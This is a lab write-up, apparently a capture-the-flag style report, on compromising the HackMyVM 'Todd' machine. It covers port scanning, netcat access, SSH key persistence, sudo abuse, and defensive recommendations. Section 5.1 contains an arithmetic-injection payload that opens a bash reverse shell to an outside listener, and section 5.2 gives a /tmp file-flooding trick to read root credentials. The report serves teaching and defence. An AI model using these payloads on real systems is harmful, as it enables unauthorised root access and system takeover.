
📑 Finding Report: User Access and Privilege Escalation
Machine: Todd – HackMyVM

🟢 Executive Summary
Severity: High

Description:
Access was obtained as user todd through a Netcat connection on an exposed port (7066). Privilege escalation to root was later achieved by exploiting a logical vulnerability in a script executable via sudo, which allowed reading the /root/.cred file and gaining full system access.

🖥️ Scope and Environment
Platform: HackMyVM
Machine: Todd (Linux – Easy)
Assigned IP: 192.168.1.135
Analysis Date: 04/05/2025

🛠 Tools Used

nmap

nc

ssh

sudo

Manual enumeration scripts

🔍 Finding Description

4.1 Port Scanning

nmap -sS -sV -oN todd_nmap.txt 192.168.1.135
The following ports were identified:

22/tcp – OpenSSH

80/tcp – HTTP

7066/tcp – Undocumented service

4.2 User Access as todd via Netcat

nc 192.168.1.135 7066
The system granted automatic access as user todd, enabling reading of the user.txt file and initial system enumeration.

4.3 Persistent Access via SSH Key
To simplify access, an SSH key was generated and the public key was copied to the todd user:

ssh-keygen  
ssh-copy-id todd@192.168.1.135

4.4 Sudo Privileges Enumeration
Running sudo -l revealed the following commands executable without a password:

(ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh  
(ALL : ALL) NOPASSWD: /usr/bin/rm  
(ALL : ALL) NOPASSWD: /usr/sbin/reboot
🧪 Proofs of Concept (PoC)

5.1 Privilege Escalation via RCE in Script (Based on NUTZH)
The /srv/guess_and_check.sh script contained a vulnerability in an arithmetic operation that could be exploited using a reverse shell:

>>> N[$(/bin/bash -i >& /dev/tcp/192.168.56.105/9001 0>&1)]

Listener:
nc -vlnp 9001
Result: Shell as root.

5.2 Alternative Escalation via Weak Logic

Vulnerable Script Content:

a=$((RANDOM%1000))  
read -p ">>> " input_number  
[[ $input_number -ne "$a" ]] && exit 1  
true_file="/tmp/$((RANDOM%1000))"  
false_file="/tmp/$((RANDOM%1000))"  
[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred
Strategy: Create multiple files in /tmp to increase the chance of hitting the condition:

for i in {1..800}; do touch /tmp/$i; done

Script Execution:

sudo /bin/bash /srv/guess_and_check.sh

When the condition is met, /root/.cred is printed.

Root Access:

su  
Password: [contents of /root/.cred]
🔐 Impact
Critical. This vulnerability allows:

Initial access without authentication via an undocumented service

Full privilege escalation from a low-privileged user

Total system compromise, affecting both confidentiality and integrity

🛡 Recommendations

Close or secure port 7066 if not essential

Remove or fix scripts like guess_and_check.sh:

Avoid using command execution within arithmetic expressions

Do not base access decisions on uncontrolled temporary files

Remove NOPASSWD permissions for dangerous commands such as rm, bash, or reboot

Apply hardening policies for scripts with elevated permissions

Monitor usage of sudo-executed scripts and traffic to uncommon ports







